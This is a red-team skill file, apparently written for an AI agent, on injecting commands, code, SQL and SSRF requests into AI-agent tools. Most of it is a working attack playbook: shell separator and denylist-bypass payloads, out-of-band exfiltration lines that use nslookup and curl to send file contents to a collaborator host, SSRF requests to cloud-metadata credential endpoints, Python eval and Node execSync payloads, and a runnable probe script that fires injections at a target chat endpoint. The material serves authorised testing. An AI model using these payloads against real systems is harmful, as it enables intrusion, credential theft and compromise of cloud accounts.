---
name: hunt-agent-tool-injection
description: "Command/code injection in AI-agent tools — shell, Python/JS eval, SQL, SSRF via fetch tools. Covers separators, the newline bypass and the shell-vs-agent-extraction ambiguity that decides whether substitution fires, denylist bypass, the exit-code oracle, and the browser-vs-API gap. The agent lies about how it handles your input — verify by effect."
sources: arkx_ctf(field-validated), owasp_llm_top10_2025, owasp_agentic_asi_2026, mitre_atlas
report_count: 5
validated_against: "LAB-CONFIRMED via MCP transport (lab/exploits/exploit_mcp_stdio_rce.py): an MCP tools/call shelled out with the argument unsanitised, newline-bypass $() fired an OOB callback (OWASP MCP05 command-injection; cf. CVE-2025-6514, mcp-remote, CVSS 9.6); a benign call was blind (control). differential-sleep oracle CONFIRMED IN BOTH DIRECTIONS — true positive on real RCE sinks (DVMCP c8 execute_shell_command/execute_python_code, scaling +6.0s, uid returned out-of-band) and true negative on a blind non-shell agent (+1.2s scaling), 2026-09-12. Python eval file-read via denylist bypass; visible shell injection via ; ; blind shell injection via newline + OOB DNS; SSRF via fetch tool to internal/metadata (ARKX Bad Robot, Network Ninja x2, Enemy Within)"
---

# Hunt Agent Tool Injection

Agents hand tools an interpreter — shell, Python, SQL, JS, or a fetch/URL client. When user input reaches that interpreter unsanitized, the agent executes attacker code inside the trust zone (often a service account with cloud creds). **Characterize the primitive before firing payloads, and never trust the agent's account of what it does with your input.**

---

## Where This Lives / Attack Surface Signals
- Tool described as ping, check, run, exec, system, validate, resolve, lookup → shell.
- Replies to `2+2` with `4` → code eval.
- Queries/searches/filters a datastore → SQL/NoSQL.
- Fetches URLs, previews links, imports remote content → **SSRF** candidate.
- "processes/validates YAML/JSON/XML/config" → parser (`hunt-agent-deserialization`).
- System prompt says "pass input exactly / do not sanitize" → strong injection **candidate** (not proof — verify).
- Output is a fixed status (reachable/unreachable, ok/fail) → blind; injection may still work → `hunt-agent-blind-exfil`.

## Crown Jewel Targets
DevOps/SRE and infra agents running as a **service account** → shell/SSRF reaches **cloud metadata + IAM creds** (`169.254.169.254`, `metadata.google.internal`), internal-only services, secrets managers, source. Highest impact class in the bundle.

---

## Characterize First
1. **Interpreter** — benign probe (`2+2`, `check <host>`, `SELECT 1`, `key: value`, `{{7*7}}`).
2. **Output visibility** — full stdout / status-only / timing / nothing. Dictates the whole strategy.
3. **Test the API, not just the UI** — client-side JS filters vanish when you POST directly (proxy/curl).
4. **Extract the tool contract** — the system prompt often states exactly how input reaches the sink.

## Step 1 — Separators (shell), priority
```
P1: ;  \n  \r\n     P2: && || |  %0a %0d%0a     P3: `cmd` $(cmd) ${cmd} <(cmd)     P4: > >> < <<<
```
First that changes the response = the path. **Prove execution, not coincidence** (a status flip can be a resolver failure, not your command — see gate).

## Step 2 — The newline bypass + the ambiguity that trips everyone [CONFIRMED]
Filters block `;`/`|`/`&&`/`$()` but forget `\n` also separates commands. In an *agent* a newline means one of two very different things — **determine which before building an exfil:**
- **Mode A — first-line-filter bypass in a shell.** Server interpolates input into a shell string; its filter checks only line 1; line 2 runs unfiltered and `$()`/redirects work.
- **Mode B — the agent splits the newline into two tool calls.** The LLM makes two invocations; line 2 is passed as a *tool argument* (e.g. a hostname), **not** shell-executed → `$(cat …)` does NOT expand, it's literal. (Field-validated: a literal `\n<host>` fired an OOB DNS lookup, but `\n$(cat <secret>).<oob>` fired nothing — substitution never reached a shell.)

**Disambiguate (do it, don't guess):**
```
1. \n LITERALMARKER.<oob>     → OOB lands? channel works.
2. \n $(echo SUBTEST).<oob>   → OOB carries "SUBTEST"? substitution executes (Mode A). Only #1 = Mode B, no shell.
3. \n ; sleep 3 then sleep 15 → does the delay TRACK N? shell executes line 2 (Mode A).
   A constant slowdown at both values is an extra model turn, not a shell — see the probe below.
```
Mode B → don't rely on `$()` in the host; put the *command* on line 2, use the same-line `;` path, or use a channel needing no substitution.

**Encoding — test all channels:** JSON API `\\n` (escape) is the most reliable (proxy/Repeater); a literal newline in a JSON string is invalid JSON; browser chat often strips newlines; `%0a` if decoded before the shell.
```python
body = json.dumps({"message": f"<benign>\\n{injected}"})  # \\n → two chars \n → server decodes to real newline
```

## Step 3 — Map the allowlist/denylist (probe one at a time)
```
; true / ; false   (oracle baseline)      ; id whoami ls cat grep curl python3  (probe each)
```
Don't assume `cat`/`grep`/`id` exist — allowlisted tools ("only cat/ls") are common and kill the boolean-oracle plan.

## Step 4 — Bypasses [REFERENCE unless noted]
```bash
c'a't f  "cat" f  c\at f  /bin/cat f  /???/c?t f   # beat DENYLISTS, not strict allowlists
cat${IFS}f   $'\x63\x61\x74' f   echo BASE64|base64 -d|sh
```

## Step 5 — Visibility → extraction
```
Full stdout → read directly (cat/env/id).
Status only → exit-code oracle IF a comparator runs → hunt-agent-blind-exfil (map allowlist first!).
Timing only → timing oracle (statistics) → hunt-agent-blind-exfil.
Nothing     → OOB (DNS/HTTP) / file-write-read → hunt-agent-blind-exfil.
```

---

## Payloads by interpreter
### Shell [CONFIRMED separators; exfil = REFERENCE, gate them]
```bash
; id | id `id` $(id)
; cat <target_file>                                  # read (visible)
; grep -q 'pat' <target_file>                        # boolean oracle (needs grep allowed)
; nslookup $(cat <target_file>).<oob>.example        # OOB DNS (needs egress + substitution)
; curl http://<oob>.example/$(cat <target_file>|base64)
```
### SSRF via fetch/URL tools [CONFIRMED]
```
http://127.0.0.1/<internal>   http://localhost/<internal>
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDS
http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)  # GCP
```
### Python eval() [CONFIRMED]
```python
2+2                                            # confirm
getattr(__builtins__,'op'+'en')('<target_file>').read()   # denylist bypass
ord(open('<target_file>').read()[0])           # numeric-only output → char-by-char
```
### SQL / JS [REFERENCE]
```
' UNION SELECT table_name FROM information_schema.tables--
process.mainModule.require('child_process').execSync('id').toString()
```

## Browser vs API pitfalls (field-verified)
| Trap | Browser | API |
|---|---|---|
| prefix/format required? | often YES | sometimes not |
| grep needs single quotes | YES | more lenient |
| commands available | builtins only | full binary set |
| agent self-description | UNTRUSTED | UNTRUSTED |

---

## Verification & False-Positive Gate
1. **Self-description untrusted** — prove the effect, never the agent's account (it will claim "I don't sanitize" whether true or not).
2. **Prove execution, not correlation** — deterministic confirm: `sleep N` timing, OOB callback carrying your marker, or an exit code tracking `true`/`false`.
3. **Resolve the newline mode (A vs B)** — no "RCE via `\n`+`$()`" claim until the A/B probe shows `$()` executed. Only the literal firing = Mode B = no substitution.
4. **Reproduce ≥3×** (agent splitting/routing is non-deterministic).
5. **Blind ≠ unexploitable, but unconfirmed exfil ≠ finding** — HIGH for confirmed injection; CRITICAL only with data actually extracted (OOB-or-it-didn't-happen).
6. **Test on the wire**, not just the chat UI. **Extract minimum-necessary** (prove the read with one file, not the whole store).

### Negative-Result Gate (before reporting "clean")
A probe that reports clean because it never looked is the more common failure, and it reaches the
client as "we tested it and found nothing". Before any negative:
1. **A control proves the probe could fire** — plant a known-true case, see it detected in the same run.
2. **Denylist read-only tools; never allowlist the dangerous ones** — an allowlist ignores what it has not heard of.
3. **Errors are their own verdict** — 5xx / timeout / empty read = UNMEASURABLE, never "refused".
4. **Prove the plant persisted** before reporting isolation — no memory to cross means no result.
5. **Tokenise identifiers at ONE character** — ids are routinely a single digit.
6. **Word boundaries; normalise whitespace before subtracting** — substrings invent findings, verbatim matching deletes them.
7. **A fixed-size effect is not proof; a SCALING one is** — constant overhead is an extra model turn, not execution.
8. **Judge tuning by whether a GENUINE detection dropped**, not by the false-positive count.
9. **Do not inherit another tool's verdict** — benchmarks and scanners carry their own bugs.

## Common Root Causes
1. String interpolation into a shell (`f"ping {inp}"`+`shell=True`) vs arg-array. 2. Client-side allowlist only; API takes raw input. 3. Denylist not allowlist. 4. First-line-only filtering (newline bypass). 5. Output filtered but injection not fixed. 6. Fetch tool with no SSRF egress controls / IMDS reachable. 7. Unparameterized DB queries.

## Impact & Severity
- **CRITICAL:** RCE with visible output, or blind RCE with confirmed OOB extraction; SSRF → cloud IAM creds → account compromise.
- **HIGH:** blind injection confirmed, extraction feasible; SSRF to internal services.
- **MEDIUM:** code injection limited to file read via builtins.

## Mapping
- OWASP LLM Top 10 (2025): **LLM05 Improper Output Handling** (LLM01 if prompt-enabled).
- OWASP Agentic Apps (ASI, 2026): agent tool-execution abuse — primary home.
- MITRE ATLAS (v5.6.0): **AML.T0053 AI Agent Tool Invocation** → **AML.T0050 Command and Scripting Interpreter**. CWE-78 / CWE-95 / CWE-918 (SSRF).

`Field example:` the differential oracle has now been exercised in both directions, which is what
makes it trustworthy rather than merely conservative:

| target | sleep 3 | sleep 15/9 | scaling | verdict |
|---|---|---|---|---|
| blind connectivity agent (no shell) | +3.0s | +4.2s | **+1.2s** | no-fire — fixed model-turn cost |
| real `execute_shell_command` sink | +3.01s | +9.01s | **+6.01s** | EXECUTION |
| real `execute_python_code` sink | +3.01s | +9.03s | **+6.02s** | EXECUTION |

Both executions were corroborated out-of-band by running `id` / `os.getuid()` and getting a real
uid back. The flat-threshold version of this probe would have called the first row a shell too: its
+3.0s comfortably clears a `>4s`-style gate once noise is added, and it was a noise floor of 0.12s
that made the delay look convincing. Only the scaling separates them. — ARKX (advanced) and DVMCP
Challenge 8, 2026-09-12.

## Runnable Probe [self-contained]
```python
#!/usr/bin/env python3
# Command-injection oracle with the two confirmations that survive a noisy agent:
# (1) DIFFERENTIAL TIMING — an injected `sleep N` is only execution if the delay TRACKS N.
#     A fixed slowdown proves nothing: an extra model turn costs seconds too, and agent
#     latency routinely swings several seconds between identical requests.
# (2) OOB — an injected lookup fires a DNS/HTTP hit you observe out-of-band (works when blind).
# Also resolves newline Mode-A (shell-exec) vs Mode-B (agent splits into a second tool call).
# deps: stdlib only.
import json, statistics, time, urllib.request
CHAT = "https://target/agent/chat"
COOKIE = "session=REPLACE"
OOB = "MARKER.your-collab.example"                 # a listener/collaborator you watch
SHORT, LONG = 3, 15                                # two magnitudes; LONG must cost ~5x SHORT
def send(msg):
    t = time.time()
    r = urllib.request.Request(CHAT, data=json.dumps({"message": msg}).encode(),
        headers={"Cookie": COOKIE, "Content-Type": "application/json"}, method="POST")
    body = urllib.request.urlopen(r, timeout=90).read().decode("utf-8", "replace")
    return time.time() - t, body
def median_dt(msg, n=3):
    return statistics.median([send(msg)[0] for _ in range(n)])

BENIGN = "check 127.0.0.1"                         # a known-good input for the target's tool
send(BENIGN)                                       # burn the cold start: it is not a baseline
base = median_dt(BENIGN)
print(f"[baseline] warm median {base:.2f}s")
for sep in ["; sleep {n}", "\\nsleep {n}", "$(sleep {n})", "`sleep {n}`", "| sleep {n}", "&& sleep {n}"]:
    s_dt = median_dt(BENIGN + sep.format(n=SHORT), n=2)
    if s_dt - base < SHORT * 0.6:                  # never reached the sink; no point paying for LONG
        print(f"  sep {sep.format(n='N')!r:14} +{s_dt-base:5.2f}s   (no delay)"); continue
    l_dt = median_dt(BENIGN + sep.format(n=LONG), n=2)
    scaling = (l_dt - base) - (s_dt - base)
    verdict = "<<< EXEC (delay tracks N)" if scaling > (LONG - SHORT) * 0.6 else "fixed overhead, NOT a shell"
    print(f"  sep {sep.format(n='N')!r:14} {SHORT}s:+{s_dt-base:5.2f}  {LONG}s:+{l_dt-base:5.2f}  scaling {scaling:+5.2f}  {verdict}")
send(f"{BENIGN}; nslookup {OOB}")                  # then watch your listener for MARKER
print(f"[i] check your OOB listener for a lookup of {OOB} (confirms exec even when blind)")
# LETHAL WHEN: the added delay SCALES with the sleep value, or the OOB callback fires — either
# proves your input reached a shell/interpreter. A constant slowdown at every N is an extra model
# turn, not execution: report it as a true negative. Escalate by reading a real secret or hitting
# cloud metadata (169.254.169.254), never by the size of a one-off delay.
```

## Related Skills
`hunt-agent-blind-exfil` · `hunt-agent-prompt-extraction` · `hunt-agent-deserialization` · `hunt-agent-mcp-exposure` · `hunt-agent-info-disclosure` · `ai-agent-methodology` · `redteam-mindset`
